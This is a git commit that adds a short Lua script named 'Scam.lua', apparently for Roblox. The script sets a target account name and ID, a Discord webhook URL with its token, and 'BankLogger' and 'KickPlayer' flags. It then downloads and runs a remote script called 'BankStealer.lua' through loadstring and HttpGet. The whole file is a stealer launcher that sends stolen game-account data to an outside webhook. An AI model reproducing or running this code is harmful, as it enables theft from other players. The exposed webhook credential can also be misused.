53330261a1459cb1547560029400a5dd27d8b95c
HE3HAKOMblE <129619143+HE3HAKOMblE@users.noreply.github.com>
2023-04-01 21:04:19 +0300

    Add files via upload

---
+++ Scam.lua
@@ -0,0 +1,7 @@
+_G.AuthName = 'Pasha_Top228001'
+_G.AuthId = 1780331089
+_G.AuthWebhook = "https://discord.com/api/webhooks/1091775341581848577/jGDRCeiEccigHwrKKogljls6SZCi1rcRG6ZRJlmpyhUl7zNalSR3RV0GAMpTJ-iaQScT"
+_G.BankLogger = true 
+_G.KickPlayer = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
